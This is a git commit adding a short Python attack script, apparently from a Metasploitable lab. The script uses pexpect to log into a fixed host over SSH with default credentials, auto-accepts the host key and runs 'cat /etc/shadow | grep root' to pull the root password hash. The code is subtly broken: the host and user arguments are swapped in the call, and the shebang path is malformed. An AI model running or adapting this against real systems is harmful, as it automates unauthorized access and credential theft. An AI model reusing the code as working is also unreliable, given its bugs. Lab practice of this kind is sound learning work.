ea76cd24482e049a1573e126dc1c18b0df5d8faa
DavidNettleship <nettleshipdavid6@gmail.com>
2020-10-20 22:04:15 +0100

    ssh login script.

---
+++ ssh_ftp_attacks/ssh_login.py
@@ -0,0 +1,37 @@
+#!usr/bin/python
+
+import pexpect
+
+PROMPT = ['# ','>>> ','> ','\$ ']
+
+def send_command(shell,command):
+    shell.sendline(command)
+    shell.expect(PROMPT)
+    print(shell.before)
+
+def connect(user,host,password):
+    ssh_new_key = 'Are you sure you want to continue connecting?'
+    connStr = 'ssh ' + user + '@' + host
+    shell = pexpect.spawn(connStr)
+    ret = shell.expect([pexpect.TIMEOUT,ssh_new_key,'[P|p]assword: '])
+    if ret == 0:
+        print("[-] Error Connecting")
+        return
+    if ret == 1:
+        shell.sendline('yes')
+        ret = shell.expect([pexpect.TIMEOUT,'[P|p]assword: '])
+        if ret == 0:
+            print("[-] Error Connecting")
+            return
+    shell.sendline(password)
+    shell.expect(PROMPT) #successful login, expecting to be in terminal (prompt)
+    return shell
+
+def main():
+    host = "192.168.1.7"
+    user = "msfadmin"
+    password = "msfadmin"
+    shell = connect(host,user,password)
+    send_command(shell, 'cat /etc/shadow | grep root;ps')
+
+main()
